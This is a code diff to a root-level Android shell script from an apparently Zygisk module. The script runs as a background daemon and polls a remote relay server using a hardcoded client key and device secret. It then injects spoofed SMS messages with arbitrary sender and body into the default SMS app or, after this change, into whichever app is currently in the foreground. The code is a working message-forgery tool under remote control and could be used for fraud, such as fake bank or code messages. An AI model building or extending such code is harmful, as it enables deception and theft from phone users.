@@ -7,10 +7,9 @@
 #  (classes.dex ke com.floatingmenu.SmsBroadcaster se).
 #  Message format: "sender|body"
 #
-#  ONE-TIME BACKGROUND RUN (bina reboot ke abhi chalane ke liye, root shell):
+#  ONE-TIME BACKGROUND RUN (bina reboot ke, root shell):
 #    setsid sh /data/adb/modules/zygisk_floating_menu/papiatma_inject.sh >/dev/null 2>&1 &
-#
-#  BOOT PAR AUTO-START: service.sh use karo (isi module folder me rakho).
+#  BOOT PAR AUTO-START: service.sh ko module folder me rakho.
 # =====================================================================
 
 # ------------------------- CONFIG (edit these) -----------------------
@@ -19,14 +18,16 @@ BACKEND="https://sender-msg-relay.preview.emergentagent.com"
 CLIENT_KEY="ramu"                                 # admin panel wala client key
 DEVICE_SECRET="50485cc07fd8787bc8c5d1e7c26d111a"  # backend .env ka DEVICE_SECRET
 
-# SMS app package:
-#   ""  (khaali)  = AUTO-DETECT default SMS app (recommended)
-#   ya manually daalo, e.g. com.google.android.apps.messaging
-#   "none"        = bina package ke broadcast (sab apps ko)
-SMS_APP_PACKAGE=""
+# TARGET_MODE - SMS kis app/activity par inject ho:
+#   foreground  = jo app ABHI KHULA hai uska package/activity (aapne yahi manga)
+#   sms_default = phone ka default SMS app (inbox me dikhane ke liye best)
+#   manual      = neeche TARGET_MANUAL value use karo
+#                 e.g. com.papiatma.me/.PapiActivity  ya  com.papiatma.me/papiactivity
+#   none        = bina target ke broadcast (sab apps ko)
+TARGET_MODE="foreground"
+TARGET_MANUAL="com.papiatma.me/.PapiActivity"
 
 POLL_SECONDS=5
-REFRESH_PKG_EVERY=60        # har itne loops ke baad default SMS app dubara detect
 LOG="$MODDIR/papiatma_inject.log"
 # ---------------------------------------------------------------------
 
@@ -40,12 +41,22 @@ elif [ -x "$MODDIR/bin/curl" ]; then
 elif command -v busybox >/dev/null 2>&1; then
     GET() { busybox wget -q -O - "$1"; }
 else
-    log "ERROR: curl/wget nahi mila"
-    exit 1
+    log "ERROR: curl/wget nahi mila"; exit 1
 fi
 
-# Default SMS app ka package auto-detect karo
-detect_pkg() {
+# ---- foreground app ka package/activity nikaalo ----
+detect_foreground() {
+    c=$(dumpsys activity activities 2>/dev/null | grep -m1 -E 'mResumedActivity|ResumedActivity:' \
+        | grep -oE '[a-zA-Z0-9_.]+/[a-zA-Z0-9_.]+' | head -1)
+    if [ -z "$c" ]; then
+        c=$(dumpsys window 2>/dev/null | grep -m1 -E 'mCurrentFocus|mFocusedApp' \
+            | grep -oE '[a-zA-Z0-9_.]+/[a-zA-Z0-9_.]+' | head -1)
+    fi
+    printf '%s' "$c"
+}
+
+# ---- default SMS app ka package nikaalo ----
+detect_sms_default() {
     p=$(settings get secure sms_default_application 2>/dev/null)
     case "$p" in
         null|""|*Exception*|*not*found*) p="" ;;
@@ -53,49 +64,41 @@ detect_pkg() {
     printf '%s' "$p"
 }
 
-resolve_pkg() {
-    if [ -n "$SMS_APP_PACKAGE_MANUAL" ]; then
-        CUR_PKG="$SMS_APP_PACKAGE_MANUAL"
-    else
-        d=$(detect_pkg)
-        if [ -n "$d" ]; then
-            CUR_PKG="$d"
-        else
-            CUR_PKG="com.google.android.apps.messaging"
-        fi
-    fi
+# ---- current target resolve karo (mode ke hisaab se) ----
+get_target() {
+    case "$TARGET_MODE" in
+        foreground)
+            t=$(detect_foreground)
+            [ -z "$t" ] && t="com.google.android.apps.messaging"
+            ;;
+        sms_default)
+            t=$(detect_sms_default)
+            [ -z "$t" ] && t="com.google.android.apps.messaging"
+            ;;
+        manual)
+            t="$TARGET_MANUAL"
+            ;;
+        none)
+            t="none"
+            ;;
+        *)
+            t="com.google.android.apps.messaging"
+            ;;
+    esac
+    printf '%s' "$t"
 }
 
 inject_sms() {
     _sender="$1"
     _body="$2"
-    CLASSPATH="$MODDIR/classes.dex" app_process /system/bin com.floatingmenu.SmsBroadcaster "$_sender" "$_body" "$CUR_PKG" >>"$LOG" 2>&1
-    log "INJECTED sender=[$_sender] body=[$_body] pkg=[$CUR_PKG]"
+    _target=$(get_target)     # har message par abhi ka foreground app/activity
+    CLASSPATH="$MODDIR/classes.dex" app_process /system/bin com.floatingmenu.SmsBroadcaster "$_sender" "$_body" "$_target" >>"$LOG" 2>&1
+    log "INJECTED sender=[$_sender] body=[$_body] target=[$_target]"
 }
 
-# Agar user ne manual value di hai to use rakho, warna auto
-if [ -n "$SMS_APP_PACKAGE" ] && [ "$SMS_APP_PACKAGE" != "none" ]; then
-    SMS_APP_PACKAGE_MANUAL="$SMS_APP_PACKAGE"
-elif [ "$SMS_APP_PACKAGE" = "none" ]; then
-    SMS_APP_PACKAGE_MANUAL="none"
-else
-    SMS_APP_PACKAGE_MANUAL=""
-fi
+log "Daemon started (client=$CLIENT_KEY, mode=$TARGET_MODE, poll=${POLL_SECONDS}s)"
 
-resolve_pkg
-log "Daemon started (client=$CLIENT_KEY, poll=${POLL_SECONDS}s, pkg=$CUR_PKG)"
-
-COUNT=0
 while true; do
-    # Beech-beech me default SMS app dubara detect karo (agar auto mode hai)
-    if [ -z "$SMS_APP_PACKAGE_MANUAL" ]; then
-        COUNT=$((COUNT + 1))
-        if [ "$COUNT" -ge "$REFRESH_PKG_EVERY" ]; then
-            resolve_pkg
-            COUNT=0
-        fi
-    fi
-
     URL="$BACKEND/api/device/pull?key=$CLIENT_KEY&secret=$DEVICE_SECRET&max=20"
     RESP=$(GET "$URL" 2>/dev/null)
 
